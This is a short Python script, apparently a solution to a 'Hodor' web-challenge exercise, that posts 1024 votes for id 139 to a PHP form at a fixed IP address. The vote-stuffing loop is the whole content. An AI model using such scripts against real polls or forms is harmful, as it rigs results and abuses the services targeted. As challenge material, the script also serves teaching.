#!/usr/bin/python3
"""
Sending a POST request to Hodor resource 1024 times
"""
import requests


for i in range(1024):
    hodor_data = {"id": "139", "holdthedoor": "Submit"}
    requests.post("http://158.69.76.135/level0.php", data=hodor_data)
